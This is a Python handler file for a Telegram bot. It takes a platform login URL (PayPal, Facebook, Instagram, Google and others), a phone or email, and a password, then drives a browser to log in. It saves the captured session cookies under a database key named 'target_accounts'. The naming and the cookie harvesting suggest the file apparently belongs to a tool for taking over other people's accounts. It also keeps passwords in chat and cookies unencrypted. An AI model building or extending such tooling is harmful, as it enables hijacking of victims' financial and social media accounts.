# handlers/user/url_login.py
from aiogram import Router, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup
from aiogram.fsm.context import FSMContext
import uuid
import time
import database as db
from utils.ui import sc, btn
from states import S
from services.browser_automation import login_with_url, detect_platform_from_url
import config

url_login_router = Router()

# FSM state — add to states.py if missing
# S.url_login_input = State()


@url_login_router.callback_query(F.data == "user:url_login")
async def start_url_login(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    await state.set_state(S.url_login_input)
    await cq.message.edit_text(
        f"🔗 <b>{sc('url login')}</b>\n\n"
        f"Login page ka URL bhejo (e.g., <code>https://instagram.com/accounts/login</code> ya <code>paypal.com</code>):\n\n"
        f"<i>AI URL se platform detect karega aur login page automate karega.</i>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("cancel", "user:main_menu", "❌")]]),
        parse_mode="HTML"
    )


@url_login_router.message(S.url_login_input)
async def receive_url(msg: Message, state: FSMContext):
    raw_url = msg.text.strip()
    if not raw_url.startswith("http"):
        raw_url = "https://" + raw_url

    platform = detect_platform_from_url(raw_url)
    if platform == "Unknown":
        return await msg.answer(
            f"❌ <b>Platform detect nahi hua</b>\n\nURL: <code>{raw_url}</code>\n\n"
            f"Supported: PayPal, Facebook, Instagram, Telegram, Twitter, Google",
            parse_mode="HTML"
        )

    await state.update_data(login_url=raw_url, platform=platform)
    await state.set_state(S.url_login_phone)
    await msg.answer(
        f"✅ <b>Detected:</b> {platform}\n\n"
        f"Ab apna <b>mobile number / email</b> daalo jo login page mein fill karna hai:",
        parse_mode="HTML"
    )


@url_login_router.message(S.url_login_phone)
async def receive_phone(msg: Message, state: FSMContext):
    phone = msg.text.strip()
    await state.update_data(phone=phone)
    await state.set_state(S.url_login_password)
    await msg.answer(
        f"📞 Phone/Email set: <code>{phone}</code>\n\n"
        f"Ab <b>password</b> daalo (ya <code>/skip</code> bhejo agar OTP flow hai):"
    )


@url_login_router.message(S.url_login_password)
async def receive_password(msg: Message, state: FSMContext):
    password = None if msg.text.strip().lower() == "/skip" else msg.text.strip()
    data = await state.get_data()
    await state.clear()

    login_url = data.get("login_url")
    platform = data.get("platform")
    phone = data.get("phone")

    status = await msg.answer(
        f"🔄 <b>Logging in via Obscura...</b>\n\n"
        f"Platform: {platform}\nURL: <code>{login_url}</code>\n\n"
        f"<i>Browser visual panel pe live dikhega.</i>",
        parse_mode="HTML"
    )

    res = await login_with_url(login_url, phone, password=password)

    # Save to DB
    d = db.load_data()
    if "target_accounts" not in d: d["target_accounts"] = {}
    acc_id = str(uuid.uuid4())[:8]
    d["target_accounts"][acc_id] = {
        "user_id": msg.from_user.id,
        "platform": platform,
        "phone": phone,
        "url": login_url,
        "status": res["status"],
        "cookies": res.get("cookies", ""),
        "final_url": res.get("final_url", ""),
        "reason": res.get("reason", ""),
        "time": int(time.time()),
    }
    db.save_data(d, force=True)

    # Mini panel token
    token = str(uuid.uuid4())
    if "mini_tokens" not in d: d["mini_tokens"] = {}
    d["mini_tokens"][token] = msg.from_user.id
    db.save_data(d, force=True)

    if res["status"] == "success":
        await status.edit_text(
            f"✅ <b>Login Attempt Complete!</b>\n\n"
            f"Platform: {platform}\n"
            f"Phone: <code>{phone}</code>\n"
            f"Final URL: <code>{res.get('final_url','')[:80]}</code>\n\n"
            f"🔗 <a href='{config.WEB_URL}/mini_panel/{token}'>Open Mini Panel</a>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [btn("view accounts", "user:acc_login", "📱")],
                [btn("main menu", "user:main_menu", "🏠")]
            ]),
            parse_mode="HTML"
        )
    else:
        await status.edit_text(
            f"❌ <b>Failed:</b> {res.get('reason','Unknown error')}\n\n"
            f"Platform: {platform}\nURL: <code>{login_url}</code>\n\n"
            f"<i>Screenshot dekho live view panel pe — real page ka status dikhega.</i>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("retry", "user:url_login", "🔄")], [btn("main menu", "user:main_menu", "🏠")]]),
            parse_mode="HTML"
        )
